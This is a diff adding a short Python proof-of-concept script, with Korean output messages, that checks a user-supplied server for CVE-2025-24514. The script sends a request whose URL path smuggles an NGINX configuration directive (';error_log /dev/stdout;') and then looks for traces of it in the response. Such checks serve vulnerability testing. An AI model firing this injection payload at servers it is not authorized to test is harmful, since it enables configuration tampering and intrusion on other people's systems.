@@ -1,0 +1,43 @@
+# SPDX-FileCopyrightText: © 2025 KimJuhyeong95 <bisyop@naver.com>
+# SPDX-License-Identifier: MIT
+
+import requests
+from colorama import init, Fore, Style
+
+init(autoreset=True)
+
+def is_vulnerable(target_url):
+    print(Fore.CYAN + f"[+] 대상에 악성 요청 전송 중: {target_url}")
+
+    headers = {
+        "Host": "poc-vuln.test.local"
+    }
+
+    # 취약한 annotation이 주입되도록 유도하는 악성 경로 (URI 내 포함)
+    payload_url = f"{target_url}/;error_log /dev/stdout;"  # NGINX 설정 주입 시도
+
+    try:
+        resp = requests.get(payload_url, headers=headers, timeout=5)
+        print(Fore.GREEN + f"[+] HTTP 응답 코드: {resp.status_code}")
+        print(Fore.YELLOW + "[+] 응답 내용 (앞 300자):\n" + Style.RESET_ALL + resp.text[:300])
+
+        # 응답 본문 또는 헤더에 흔적이 있는지 확인
+        if ("error_log" in resp.text) or ("auth-url" in resp.text):
+            print(Fore.RED + "[!!!] 취약 가능성이 매우 높음: NGINX 설정 노출 의심됨")
+        else:
+            print(Fore.CYAN + "[*] 명확한 증거는 없지만 일부 조건은 충족함")
+
+    except requests.exceptions.RequestException as e:
+        print(Fore.RED + f"[!] 요청 실패: {e}")
+
+def main():
+    print(Fore.BLUE + "[=] CVE-2025-24514 원격 취약점 점검 PoC 시작 =\n")
+    target = input(Fore.YELLOW + "[?] 대상 서버 URL/IP를 입력하세요 (예: http://203.0.113.5): ").strip()
+
+    if not target.startswith("http"):
+        target = "http://" + target  # 기본 HTTP
+
+    is_vulnerable(target)
+
+if __name__ == "__main__":
+    main()
